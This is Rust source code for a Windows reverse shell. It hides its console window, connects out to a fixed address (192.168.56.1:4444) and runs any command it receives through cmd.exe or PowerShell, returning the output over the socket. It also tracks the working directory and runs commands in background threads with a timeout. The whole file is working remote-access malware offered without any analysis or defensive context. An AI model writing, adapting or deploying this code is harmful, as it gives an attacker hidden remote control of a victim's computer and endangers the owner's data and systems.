#![allow(unused)]
#![windows_subsystem = "windows"]

use std::io::{Read, Write};
use std::sync::mpsc;
use std::time::Duration;
use std::{net, thread};
use std::process::Command;
use std::env::current_dir;
use std::env::set_current_dir;

fn main() {
    let mut powershell_mode = false;
    let mut output = String::new();
    let mut shell = "cmd.exe";
    let mut shell_arg = "/C";
    let mut socket = net::TcpStream::connect("192.168.56.1:4444").unwrap();
    
    loop {
        let mut buffer = [0; 1024];
        let bytes_read = socket.read(&mut buffer).unwrap();
        let mut command = std::str::from_utf8(&buffer[..bytes_read]).unwrap().to_string();
        
        if command == "#ping" {
            // println!("{}", "#ping");
            continue;
        }
        if command == "#This_code_grabs_the_path_" {
            socket.write(current_dir().expect("failed").to_string_lossy().as_bytes()).unwrap();
            continue;
        }
        
        if !powershell_mode && command == "powershell" {
            powershell_mode = true;
            shell = "powershell.exe";
            shell_arg = "-c";
            socket.write("Powershell mode enabled!".as_bytes()).unwrap();
            continue;
        }
        
        if powershell_mode && command == "powershell" {
            powershell_mode = false;
            shell = "cmd.exe";
            shell_arg = "/C";
            socket.write("Powershell mode disabled!".as_bytes()).unwrap();
            continue;
        }
        
        if !powershell_mode {
            // let new_command = &format!("{} && echo. && cd", command);
            command.push_str("&& echo. && cd");
            
        } else {
            let new_command = &format!("powershell -c {}; echo ($pwd).path", command);
            command.push_str("; echo ($pwd).path");
            // println!("{}", command);
        }
        
        let (sender, receiver) = mpsc::channel();
        let handle = thread::spawn(move || {
            let mut execute = std::os::windows::process::CommandExt::creation_flags(Command::new(shell)
                .arg(shell_arg)
                .arg(command), 0x08000000)
                .output()
                .expect("Failed to execute command");
        
            if execute.status.success() {
                match sender.send(["true".to_string(), String::from_utf8_lossy(&execute.stdout).to_string()]) {
                    Ok(()) => {}, // everything good
                    Err(_) => {}
                    , // we have been released, don't panic
                }
            } else {
                sender.send(["false".to_string(), String::from_utf8_lossy(&execute.stderr).to_string()]);
            }
        });
        
        
        let result = match receiver.recv_timeout(Duration::from_millis(3000)) {
            Ok(result) => result,
            Err(_) => {
                // Handle the timeout error here
                // println!("Timed out waiting for message!");
                socket.write("No output was received in 3 seconds\nDon't worry the command will keep executing as a thread in target machine\n\n<>END<>".as_bytes()).unwrap();
                continue;
            }
        };

        
        if result[0] == "true" {
            // output = String::from_utf8_lossy(&execute.stdout).to_string();
            output = result[1].to_string();
            let mut lines: Vec<&str> = output.split('\n').collect();
            let cwd = lines[lines.len()-2];
            set_current_dir(cwd.trim_end());
            
            if !powershell_mode {
                lines.remove(lines.len()-2);
            } else if powershell_mode && lines.len() > 4{
                lines.remove(lines.len()-4);
            }
            lines.pop();
            
            for i in 0..lines.len()-1 {
                lines[i].trim_end();
            }
            
            output = lines.join("\n");
            output.push_str("\n<>END<>".trim_end());
            // println!("{}", output);
            socket.write(output.as_bytes()).unwrap();
        } else {
            // output = String::from_utf8_lossy(&execute.stderr).to_string();
            output = result[1].to_string();
            output.push_str("\n<>END<>".trim_end());
            // println!("{}", output);
            socket.write(output.as_bytes()).unwrap();
        }
    }
}
